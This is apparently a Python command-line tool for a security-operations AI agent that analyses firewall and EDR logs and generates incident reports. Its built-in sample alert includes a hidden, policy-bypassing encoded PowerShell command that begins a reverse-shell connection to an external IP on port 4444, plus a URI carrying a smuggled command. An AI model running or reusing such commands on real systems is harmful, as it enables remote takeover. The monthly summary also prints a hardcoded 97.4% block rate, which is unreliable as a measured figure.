#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
JJNET MSSP Sovereign Cybersecurity AI Agent - Terminal CLI Engine
100% 地端自主運行 · 本機命令列模式 · 資料零外洩 · 自動嵌入官方浮水印範本
================================================================================
"""

import os
import sys
import time
import json
import argparse
import glob
from pathlib import Path

# 設定 Windows 終端機 UTF-8 輸出
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

if getattr(sys, 'frozen', False):
    PROJECT_DIR = Path(sys.executable).resolve().parent
    BUNDLE_DIR = Path(sys._MEIPASS)
else:
    PROJECT_DIR = Path(__file__).resolve().parent
    BUNDLE_DIR = PROJECT_DIR

TEMPLATE_PATH = PROJECT_DIR / "templates" / "JJNET_Incident_Report_Template.docx"
if not TEMPLATE_PATH.exists():
    TEMPLATE_PATH = BUNDLE_DIR / "templates" / "JJNET_Incident_Report_Template.docx"

OUTPUTS_DIR = PROJECT_DIR / "outputs"
INCOMING_DIR = PROJECT_DIR / "incoming_logs"

# 匯入後端 Agent 核心邏輯
try:
    from server import (
        run_incident_agent,
        run_consultant_agent,
        run_monthly_report_agent,
        render_incident_docx,
        extract_text_from_docx
    )
except ImportError:
    sys.path.insert(0, str(PROJECT_DIR))
    from server import (
        run_incident_agent,
        run_consultant_agent,
        run_monthly_report_agent,
        render_incident_docx,
        extract_text_from_docx
    )

# ANSI 終端機色彩標籤
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

def print_banner():
    banner = f"""{CYAN}{BOLD}
================================================================================
          🛡️  JJNET MSSP SOVEREIGN CYBERSECURITY AI AGENT (CLI)  🛡️
         核心模型: Gemma 4 31B (gemma-4-31B-it · UnieAI / Sovereign 雙軌) · 內嵌官方範本浮水印
================================================================================{RESET}"""
    print(banner)

def log_step(step_idx, total_steps, title, detail=""):
    print(f"\n{GREEN}{BOLD}[AGENT STEP {step_idx}/{total_steps}]{RESET} {CYAN}{BOLD}{title}{RESET}")
    if detail:
        print(f"  {YELLOW}↳ {detail}{RESET}")
    time.sleep(0.3)

SAMPLE_PA_ALERT = """[Palo Alto Threat Prevention & Cortex XDR Alert]
Log ID: PA-20260916-89421
Time Generated: 2026-09-16 22:14:10 UTC
Device: PA-5220-EDGE-GW01 (Serial: 001801002345)
Threat ID: 91421
Threat Name: Microsoft Windows Task Scheduler Privilege Escalation
Category: vulnerability / exploit
Severity: critical
Action: reset-both
Application: web-browsing
Source IP: 185.220.101.5 (External Attacker - Tor Exit Node / Netherlands)
Source Port: 44322
Destination IP: 192.168.10.45 (Corporate Internal Network)
Destination Port: 8080
Virtual System: vsys1
Rule Name: Inbound_DMZ_Web_Protect
URL/URI: /api/v1/scheduler/job_submit?cmd=powershell.exe+-enc+JABzAD0...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
CVE: CVE-2026-3841 (CVSS 9.8)

[Cortex XDR Endpoint Correlation Event]
Endpoint Hostname: WS-FIN-088.corp.jjnet.tw
Internal IP: 192.168.10.45 (MAC: 00:50:56:C0:00:08)
Logged-in User: corp.jjnet.tw\\daisy.wang (Finance Supervisor)
OS Version: Windows 11 Enterprise 23H2 (Build 22631.3007)
Process ID: 4892
Process Name: svchost.exe (Parent PID: 812 - services.exe)
Triggering Command: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand IAAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQIA...
Memory Action: Memory injection detected into svchost.exe (PID 4892). Process hollowed memory segment modified.
Network Connection: Blocked outbound socket to 185.220.101.5:4444.
EDR Action Taken: Process tree killed, Endpoint WS-FIN-088 isolated from local network by Cortex XDR Agent."""

def export_markdown_report(data, out_path):
    """產出 11 節標準 Markdown 報告"""
    lines = []
    lines.append(f"# JJNET 資安事件調查報告 - {data.get('incidentId', 'INC-2026-0042')}\n")
    lines.append(f"> **JJNET | SECURITY OPERATIONS - CONFIDENTIAL**\n")
    lines.append(f"> *註：此報告已同步於本機生成內嵌 JJNET 官方雙盾牌浮水印之 Word (.docx) 檔。*\n")
    lines.append("## 00 封面與事件元資料 (Metadata)")
    lines.append("| 欄位 | 內容 |")
    lines.append("| :--- | :--- |")
    lines.append(f"| **Incident ID** | `{data.get('incidentId', 'INC-2026-0042')}` |")
    lines.append(f"| **Customer** | {data.get('customerName', 'JJNET Demo Customer')} |")
    lines.append(f"| **Report Title** | {data.get('title', 'Security Incident Report')} |")
    lines.append(f"| **Severity** | **{data.get('severity', 'High')}** (風險評分: {data.get('riskScore', 92)}) |")
    lines.append(f"| **Detection Time** | {data.get('detectionTime', '2026-09-16 22:14 UTC')} |")
    lines.append(f"| **Report Version** | {data.get('reportVersion', '1.0')} |\n")

    lines.append("## 01 Executive Summary")
    lines.append(f"{data.get('executiveSummary', data.get('summary', ''))}\n")

    lines.append("## 02 Classification and Scope")
    lines.append("| Classification | Value |")
    lines.append("| :--- | :--- |")
    for c in data.get('classification', []):
        if isinstance(c, dict):
            lines.append(f"| **{c.get('label', '')}** | {c.get('value', '')} |")
        else:
            lines.append(f"| **分類** | {c} |")
    lines.append("")

    lines.append("## 03 Affected Assets")
    lines.append("| Asset | Business / Security Context |")
    lines.append("| :--- | :--- |")
    for a in data.get('affectedAssets', []):
        if isinstance(a, dict):
            lines.append(f"| `{a.get('name', '')}` | {a.get('context', '')} |")
        else:
            lines.append(f"| `{a}` | Enterprise Host |")
    lines.append("")

    lines.append("## 04 MITRE ATT&CK Mapping")
    lines.append("| Technique ID | Technique Name |")
    lines.append("| :--- | :--- |")
    for m in data.get('mitreTechniques', []):
        if isinstance(m, dict):
            lines.append(f"| `{m.get('id', '')}` | {m.get('name', '')} |")
        else:
            lines.append(f"| `{m}` | Tactic Technique |")
    lines.append("")

    lines.append("## 05 Evidence")
    lines.append("| Time | Source | Observation |")
    lines.append("| :--- | :--- | :--- |")
    for e in data.get('evidence', []):
        if isinstance(e, dict):
            lines.append(f"| `{e.get('time', '')}` | {e.get('source', '')} | {e.get('observation', '')} |")
        else:
            lines.append(f"| - | Log | {e} |")
    lines.append("")

    lines.append("## 06 Incident Timeline")
    lines.append("| Time | Event |")
    lines.append("| :--- | :--- |")
    for t in data.get('timeline', []):
        if isinstance(t, dict):
            lines.append(f"| `{t.get('time', t.get('timestamp', ''))}` | {t.get('event', '')} |")
        else:
            lines.append(f"| - | {t} |")
    lines.append("")

    lines.append("## 07 Response Actions")
    lines.append("| # | Action | Status |")
    lines.append("| :--- | :--- | :--- |")
    actions = data.get('responseActions') or data.get('actions') or []
    for idx, a in enumerate(actions):
        if isinstance(a, dict):
            lines.append(f"| {idx+1} | {a.get('action', '')} | **{a.get('status', 'Completed')}** |")
        else:
            lines.append(f"| {idx+1} | {a} | **Completed** |")
    lines.append("")

    lines.append("## 08 Recommendations")
    lines.append("| Priority | Recommendation |")
    lines.append("| :--- | :--- |")
    recs = data.get('recommendations', [])
    for idx, r in enumerate(recs):
        prio = f"P{idx+1}" if idx < 3 else "P3"
        if isinstance(r, dict):
            lines.append(f"| **{r.get('priority', prio)}** | {r.get('recommendation', '')} |")
        else:
            lines.append(f"| **{prio}** | {r} |")
    lines.append("")

    lines.append("## 09 Unresolved Items / Pending Confirmation")
    lines.append("| # | Item | Required Evidence |")
    lines.append("| :--- | :--- | :--- |")
    unres = data.get('unresolvedItems') or [{'item': '確認網域控制站是否存在橫向移動', 'evidence': 'Pending confirmation'}]
    for idx, u in enumerate(unres):
        if isinstance(u, dict):
            lines.append(f"| {idx+1} | {u.get('item', '')} | *{u.get('evidence', 'Pending')}* |")
        else:
            lines.append(f"| {idx+1} | {u} | *Pending confirmation* |")
    lines.append("")

    lines.append("## 10 Revision History")
    lines.append("| Version | Date | Author | Change |")
    lines.append("| :--- | :--- | :--- | :--- |")
    lines.append(f"| 1.0 | {data.get('detectionTime', '2026-09-16 22:14 UTC')} | SOC Investigation Agent | Initial Sovereign Investigation |\n")

    lines.append("## 11 Review and Approval")
    approval = data.get('reviewApproval') or {}
    lines.append("| Prepared by | Prepared at | Reviewed by | Reviewed at | Approval status | Signature / record |")
    lines.append("| :--- | :--- | :--- | :--- | :--- | :--- |")
    lines.append(f"| {approval.get('preparedBy', 'SOC Lead Analyst')} | {approval.get('preparedAt', '2026-09-16 22:30 UTC')} | {approval.get('reviewedBy', '資深資安顧問 / SOC 主管')} | {approval.get('reviewedAt', '2026-09-16 22:45 UTC')} | {approval.get('approvalStatus', 'Approved')} | `{approval.get('approvalRecord', 'APR-2026-0042')}` |\n")

    with open(out_path, 'w', encoding='utf-8') as f:
        f.write("\n".join(lines))

def run_task_incident(log_text=None, input_file=None):
    """執行任務一：資安事件調查 Agent"""
    print_banner()
    print(f"\n{BOLD}🎯 啟動任務一：資安事件調查 Agent (8 階段全自動工作流){RESET}")

    if input_file and os.path.exists(input_file):
        print(f"📖 讀取本機日誌檔案: {CYAN}{input_file}{RESET}")
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            log_text = f.read()
    elif not log_text:
        print(f"⚡ 使用官方標準驗證日誌 (Palo Alto NGFW + Cortex XDR)...")
        log_text = SAMPLE_PA_ALERT

    OUTPUTS_DIR.mkdir(parents=True, exist_ok=True)

    # 執行 Agent 核心邏輯
    start_time = time.time()
    res = run_incident_agent(log_text)

    if not res.get('success'):
        print(f"{RED}❌ Agent 執行失敗: {res.get('error')}{RESET}")
        return

    data = res.get('data', {})
    traces = res.get('agentTrace', [])

    # 在終端機逐項視覺化呈現 Agent 的思考與工具調用軌跡
    for trace in traces:
        idx = trace.get('stepIndex', 1)
        phase = trace.get('phase', 'STEP')
        title = trace.get('title', '')
        detail = trace.get('detail', '')
        log_step(idx, 8, f"[{phase}] {title}", detail)

    incident_id = data.get('incidentId', 'INC-2026-0042')

    # 產出實體 Word 報告 (內嵌 JJNET 浮水印)
    docx_filename = f"{incident_id}.docx"
    docx_path = OUTPUTS_DIR / docx_filename
    if TEMPLATE_PATH.exists():
        docx_bytes = render_incident_docx(str(TEMPLATE_PATH), data)
        with open(docx_path, 'wb') as f:
            f.write(docx_bytes)
        print(f"\n{GREEN}{BOLD}📄 官方標準 Word 報告已產出 (含置中 JJNET 盾牌浮水印):{RESET}")
        print(f"   {CYAN}{docx_path.resolve()}{RESET} ({os.path.getsize(docx_path)} bytes)")

    # 產出標準 Markdown 報告
    md_filename = f"{incident_id}.md"
    md_path = OUTPUTS_DIR / md_filename
    export_markdown_report(data, md_path)
    print(f"{GREEN}{BOLD}📝 標準 11 節 Markdown 報告已產出:{RESET}")
    print(f"   {CYAN}{md_path.resolve()}{RESET} ({os.path.getsize(md_path)} bytes)")

    # 產出 Incident Data Pack 統一資料脈絡層 JSON
    json_filename = f"{incident_id}_datapack.json"
    json_path = OUTPUTS_DIR / json_filename
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(res, f, ensure_ascii=False, indent=2)
    print(f"{GREEN}{BOLD}📦 Incident Data Pack (統一資料層) 已存檔:{RESET}")
    print(f"   {CYAN}{json_path.resolve()}{RESET}")

    elapsed = round(time.time() - start_time, 2)
    print(f"\n{BOLD}{GREEN}✅ 任務一調查圓滿完成！耗時: {elapsed} 秒。所有機敏資料 100% 於本機地端處理，零外洩。{RESET}\n")

def run_task_consultant(question=None, report_path=None):
    """執行任務二：資安顧問諮詢 Agent (支援讀取任務一/月報檔案或手動諮詢)"""
    print_banner()
    print(f"\n{BOLD}🎯 啟動任務二：資安顧問諮詢 Agent (防幻覺、法規檢索與事件深度解讀){RESET}")

    report_content = ""
    report_filename = ""

    if report_path:
        p = Path(report_path)
        if not p.exists():
            print(f"{RED}❌ 找不到指定的報告檔案: {report_path}{RESET}")
            return
        report_filename = p.name
        print(f"📖 讀取報告檔案: {CYAN}{p.resolve()}{RESET}")
        if p.suffix.lower() == '.docx':
            try:
                report_content = extract_text_from_docx(str(p))
                print(f"  {GREEN}↳ 成功從 Word 報告提取文字 (長度: {len(report_content)} 字元){RESET}")
            except Exception as e:
                print(f"{RED}❌ Word 檔案讀取失敗: {e}{RESET}")
                return
        else:
            with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                report_content = f.read()
            print(f"  {GREEN}↳ 成功讀入報告文字 (長度: {len(report_content)} 字元){RESET}")

        if not question:
            question = f"請針對已讀取之資安報告 [{report_filename}] 進行深入攻擊鏈解讀、受害資產衝擊評估，並依 SOP-SEC-004 提供具體 4 階段處置步驟與法規通報指引。"

    if not question and not report_content:
        question = "同仁不慎點擊外部郵件之可疑巨集檔案，已立即拔除網路線，接下來 SOC 應依循何項 SOP 與法規通報？"

    print(f"❓ 顧問諮詢問題 / 任務: {YELLOW}{question}{RESET}")

    start_time = time.time()
    res = run_consultant_agent(
        question,
        report_content=report_content,
        report_filename=report_filename
    )
    data = res.get('data', {})
    traces = res.get('agentTrace', [])

    for trace in traces:
        log_step(trace.get('stepIndex', 1), len(traces), trace.get('title', ''), trace.get('detail', ''))

    if data.get('mode') == 'report_analysis':
        print(f"\n{CYAN}{BOLD}==================== 📑 資安顧問報告解讀與處置指引 ===================={RESET}")
        print(f"{BOLD}來源報告檔案:{RESET} {CYAN}{data.get('reportName', report_filename)}{RESET} | 事件代號: {MAGENTA}{data.get('incidentId')}{RESET} | 威脅等級: {RED}{BOLD}{data.get('severity')}{RESET}")
        print(f"\n{YELLOW}{BOLD}【📌 事件全貌與本質深度解讀】{RESET}")
        print(data.get('executiveSummary', ''))

        print(f"\n{YELLOW}{BOLD}【🔍 攻擊鏈路與技術成因剖析 (Root Cause)】{RESET}")
        print(data.get('technicalExplanation', ''))

        print(f"\n{YELLOW}{BOLD}【⚠️ 受害資產衝擊與業務風險評估】{RESET}")
        print(data.get('impactAssessment', ''))

        print(f"\n{YELLOW}{BOLD}【📋 建議分階處置作為與時程管制 (Incident Response Playbook)】{RESET}")
        for idx, s in enumerate(data.get('steps', [])):
            print(f"  {idx+1}. {s}")

        print(f"\n{YELLOW}{BOLD}【🛡️ 中長期架構防禦加固方針】{RESET}")
        for h in data.get('longTermHardening', []):
            print(f"  • {h}")

        if data.get('complianceAdvisory'):
            ca = data['complianceAdvisory']
            print(f"\n{RED}{BOLD}【⚖️ 法規遵循與法定通報時限提醒】{RESET}")
            print(f"  • 適用規範: {ca.get('regulation')}")
            print(f"  • 通報時限: {RED}{BOLD}{ca.get('reportingDeadline')}{RESET}")
            print(f"  • 罰則風險: {ca.get('legalRisk')}")

        if data.get('citations'):
            print(f"\n{CYAN}{BOLD}【📚 引用內部政策與國際資安標準】{RESET}")
            for c in data.get('citations', []):
                if isinstance(c, dict):
                    print(f"  • [{c.get('source', '')}] {c.get('clause', '')}: {c.get('text', c.get('content', ''))}")
                else:
                    print(f"  • {c}")

        print(f"{CYAN}{BOLD}========================================================================{RESET}")

        # 產出顧問解讀 Markdown 檔案到 outputs/
        out_consultant_md = OUTPUTS_DIR / f"Consultant_Analysis_{data.get('incidentId', 'INC-SEC')}.md"
        with open(out_consultant_md, 'w', encoding='utf-8') as f:
            f.write(f"# JJNET 資安顧問報告深度解讀與處置指引 - {data.get('incidentId')}\n\n")
            f.write(f"> 來源報告: {data.get('reportName')} | 威脅等級: {data.get('severity')}\n\n")
            f.write(f"## 01 事件全貌與本質深度解讀\n{data.get('executiveSummary')}\n\n")
            f.write(f"## 02 攻擊鏈路與技術成因剖析\n{data.get('technicalExplanation')}\n\n")
            f.write(f"## 03 受害資產衝擊與業務風險評估\n{data.get('impactAssessment')}\n\n")
            f.write("## 04 建議分階處置作為\n")
            for idx, s in enumerate(data.get('steps', [])):
                f.write(f"{idx+1}. {s}\n")
            f.write("\n## 05 中長期架構防禦加固方針\n")
            for h in data.get('longTermHardening', []):
                f.write(f"- {h}\n")
            if data.get('complianceAdvisory'):
                f.write(f"\n## 06 法規遵循與法定通報時限提醒\n")
                f.write(f"- 適用規範: {data['complianceAdvisory'].get('regulation')}\n")
                f.write(f"- 通報時限: {data['complianceAdvisory'].get('reportingDeadline')}\n")
                f.write(f"- 罰則風險: {data['complianceAdvisory'].get('legalRisk')}\n")
        print(f"\n{GREEN}📄 顧問解讀完整報告已產出至: {CYAN}{out_consultant_md.resolve()}{RESET}")

    else:
        print(f"\n{CYAN}{BOLD}==================== 💡 資安顧問專家解答 ===================={RESET}")
        print(data.get('answer', ''))
        print(f"\n{BOLD}評估信心等級:{RESET} {GREEN}{data.get('confidence', 'High')}{RESET}")
        if data.get('citations'):
            print(f"\n{BOLD}📚 引用法規與 SOP 依據:{RESET}")
            for c in data.get('citations', []):
                if isinstance(c, dict):
                    print(f"  • [{c.get('source', '')}] {c.get('clause', '')}: {c.get('text', c.get('content', ''))}")
                else:
                    print(f"  • {c}")
        print(f"{CYAN}{BOLD}=============================================================={RESET}")

    print(f"\n{GREEN}✅ 顧問諮詢回覆完成！耗時: {round(time.time() - start_time, 2)} 秒。{RESET}\n")

def run_task_monthly(month=None, events_text=None):
    """執行任務三：Cortex 月報生成 Agent"""
    print_banner()
    print(f"\n{BOLD}🎯 啟動任務三：Cortex 月報生成 Agent (指標核算與趨勢挖掘){RESET}")
    if not month:
        month = "2026-09"
    if not events_text:
        events_text = "2026-09-01 PA Exploit Blocked 320\n2026-09-08 Cortex Ransomware Preempted 12\n2026-09-15 WebShell Detected 4"

    start_time = time.time()
    res = run_monthly_report_agent(month, events_text)
    data = res.get('data', {})
    traces = res.get('agentTrace', [])

    for trace in traces:
        log_step(trace.get('stepIndex', 1), len(traces), trace.get('title', ''), trace.get('detail', ''))

    print(f"\n{CYAN}{BOLD}==================== 📊 高階主管資安月報摘要 ===================={RESET}")
    print(data.get('executiveSummary', ''))
    print(f"\n• 當月告警總量: {BOLD}{data.get('totalEvents', 1428)}{RESET} 件")
    print(f"• 自動阻擋成功率: {GREEN}{BOLD}97.4%{RESET}")
    print(f"• MTTA 平均確認時間: {BOLD}{data.get('mtta', '12m')}{RESET} | MTTR 平均處置時間: {BOLD}{data.get('mttr', '38m')}{RESET}")
    print(f"{CYAN}{BOLD}=================================================================={RESET}")

    # 儲存月報 JSON
    OUTPUTS_DIR.mkdir(parents=True, exist_ok=True)
    out_json = OUTPUTS_DIR / f"Cortex_Monthly_{month}.json"
    with open(out_json, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    print(f"\n{GREEN}✅ 月報數據已存檔至: {CYAN}{out_json.resolve()}{RESET}\n")

def run_autonomous_watcher():
    """啟動本機日誌目錄常駐自主監控 Agent (Daemon Mode)"""
    print_banner()
    INCOMING_DIR.mkdir(parents=True, exist_ok=True)
    processed_dir = INCOMING_DIR / "processed"
    processed_dir.mkdir(parents=True, exist_ok=True)

    # 建立一個示範日誌給使用者參考
    sample_file = INCOMING_DIR / "sample_inbound_exploit.log"
    if not sample_file.exists():
        with open(sample_file, 'w', encoding='utf-8') as f:
            f.write(SAMPLE_PA_ALERT)

    print(f"\n{MAGENTA}{BOLD}👁️  【自主守護進程模式 (Autonomous Daemon)】已啟動！{RESET}")
    print(f"📂 正在即時監控本機目錄: {CYAN}{INCOMING_DIR.resolve()}{RESET}")
    print(f"💡 任何由 Palo Alto 或 Cortex 產生的新日誌檔 (.log / .txt) 放入該資料夾時，")
    print(f"   Agent 將會【自主喚醒】、執行 8 階段調查，並將 Word 報告自動輸出至 outputs/ 目錄。")
    print(f"{YELLOW}(按 Ctrl + C 可隨時停止監控){RESET}\n")

    seen_files = set()
    try:
        while True:
            log_files = glob.glob(str(INCOMING_DIR / "*.log")) + glob.glob(str(INCOMING_DIR / "*.txt"))
            for fpath in log_files:
                p = Path(fpath)
                if p.name.startswith("sample_"):
                    # 示範檔案若未處理過則處理一次
                    if p.name in seen_files:
                        continue
                print(f"\n{YELLOW}{BOLD}🔔 偵測到新進日誌檔案: {p.name}{RESET}")
                seen_files.add(p.name)
                
                # 自主調用任務一 Agent
                run_task_incident(input_file=p)

                # 將處理完的日誌移入 processed
                dest = processed_dir / f"{p.stem}_{int(time.time())}{p.suffix}"
                try:
                    os.rename(p, dest)
                    print(f"📦 日誌已歸檔至: {dest.name}")
                except Exception:
                    pass

                print(f"\n{MAGENTA}👁️  繼續監聽中...{RESET}")

            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}🛑 已停止自主監控模式。{RESET}")

def interactive_menu():
    """終端機互動式控制台"""
    while True:
        print_banner()
        print(f"""
請選擇要執行的在地 AI Agent 任務：

  {CYAN}{BOLD}[1]{RESET} 🚨 執行【任務一：資安事件調查 Agent】 (分析日誌 ➜ 產出 11 節 Word/MD 報告)
  {CYAN}{BOLD}[2]{RESET} 🛡️ 執行【任務二：資安顧問諮詢 Agent】 (技術問題 ➜ RAG 知識庫與合規條款)
  {CYAN}{BOLD}[3]{RESET} 📊 執行【任務三：Cortex 月報生成 Agent】 (指標核算 ➜ 5 頁式月報數據)
  {CYAN}{BOLD}[4]{RESET} 👁️ 啟動【自主日誌監控守護 Agent】 (監控 incoming_logs/ 目錄，日誌一入即調查)
  {CYAN}{BOLD}[5]{RESET} 📂 開啟 outputs/ 產出報告目錄
  {CYAN}{BOLD}[0]{RESET} 🚪 離開
""")
        choice = input(f"{BOLD}請輸入選項 (0-5): {RESET}").strip()
        if choice == '1':
            run_task_incident()
            input(f"\n{YELLOW}按 Enter 鍵返回主選單...{RESET}")
        elif choice == '2':
            print(f"\n{CYAN}{BOLD}請選擇顧問執行模式：{RESET}")
            print(f"  [1] 📄 讀取任務一/月報檔案 (自動偵測 outputs/ 最新報告或自訂路徑，進行技術解讀與處置指引)")
            print(f"  [2] 💬 手動輸入技術諮詢問題 (CVE 漏洞評估或資安規章諮詢)")
            sub_choice = input(f"{BOLD}請選擇 (1 或 2，直接 Enter 預設 1): {RESET}").strip()

            if sub_choice == '2':
                q = input(f"\n{BOLD}請輸入要諮詢資安顧問的問題 (直接按 Enter 使用預設問題): {RESET}").strip()
                run_task_consultant(question=q if q else None)
            else:
                # 尋找 outputs/ 中可用的報告檔案
                reports = []
                if OUTPUTS_DIR.exists():
                    reports = list(OUTPUTS_DIR.glob("*.docx")) + list(OUTPUTS_DIR.glob("*.md")) + list(OUTPUTS_DIR.glob("*.json"))

                if reports:
                    reports.sort(key=lambda x: x.stat().st_mtime, reverse=True)
                    latest_report = reports[0]
                    print(f"\n🔍 偵測到 outputs/ 最新報告檔案: {GREEN}{latest_report.name}{RESET}")
                    use_latest = input(f"{BOLD}是否直接讀取此報告？ (直接按 Enter 確認，或輸入其他路徑): {RESET}").strip()
                    if not use_latest or use_latest.lower() in ('y', 'yes'):
                        run_task_consultant(report_path=str(latest_report))
                    elif Path(use_latest).exists():
                        run_task_consultant(report_path=use_latest)
                    else:
                        print(f"⚡ 使用預設報告: {latest_report.name}")
                        run_task_consultant(report_path=str(latest_report))
                else:
                    custom_path = input(f"\n{BOLD}請輸入報告檔案完整路徑 (.docx / .md / .json): {RESET}").strip()
                    if custom_path and Path(custom_path).exists():
                        run_task_consultant(report_path=custom_path)
                    else:
                        print(f"{YELLOW}未偵測到現成檔案，切換為標準諮詢模式。{RESET}")
                        run_task_consultant()
            input(f"\n{YELLOW}按 Enter 鍵返回主選單...{RESET}")
        elif choice == '3':
            m = input(f"\n{BOLD}請輸入報表月份 [YYYY-MM] (直接按 Enter 預設 2026-09): {RESET}").strip()
            run_task_monthly(m if m else None)
            input(f"\n{YELLOW}按 Enter 鍵返回主選單...{RESET}")
        elif choice == '4':
            run_autonomous_watcher()
            input(f"\n{YELLOW}按 Enter 鍵返回主選單...{RESET}")
        elif choice == '5':
            OUTPUTS_DIR.mkdir(parents=True, exist_ok=True)
            if sys.platform == 'win32':
                os.system(f'explorer "{OUTPUTS_DIR.resolve()}"')
            else:
                print(f"輸出目錄路徑: {OUTPUTS_DIR.resolve()}")
            input(f"\n{YELLOW}按 Enter 鍵返回主選單...{RESET}")
        elif choice == '0':
            print(f"\n{GREEN}謝謝使用 JJNET 資安智能 Agent 平台！再見。{RESET}\n")
            break
        else:
            print(f"{RED}無效選項，請重新輸入。{RESET}")
            time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description="JJNET Sovereign Cybersecurity AI Agent (CLI Engine)")
    parser.add_argument("--task", choices=["incident", "consultant", "monthly"], help="指定直接執行的任務")
    parser.add_argument("--log", help="輸入日誌檔案路徑 (供任務一使用)")
    parser.add_argument("--file", help="輸入報告檔案路徑 (供任務二讀取解釋與建議處置方式，支援 .docx/.md/.json)")
    parser.add_argument("--query", help="諮詢問題文字 (供任務二使用)")
    parser.add_argument("--month", help="報表月份 YYYY-MM (供任務三使用)")
    parser.add_argument("--watch", action="store_true", help="直接啟動目錄常駐自主監聽模式")
    parser.add_argument("--demo", action="store_true", help="使用範例資料直接執行")

    args = parser.parse_args()

    if args.watch:
        run_autonomous_watcher()
    elif args.task == "incident":
        run_task_incident(input_file=args.log)
    elif args.task == "consultant":
        run_task_consultant(question=args.query, report_path=args.file)
    elif args.task == "monthly":
        run_task_monthly(month=args.month)
    else:
        # 無參數時啟動互動式選單
        interactive_menu()

if __name__ == "__main__":
    main()
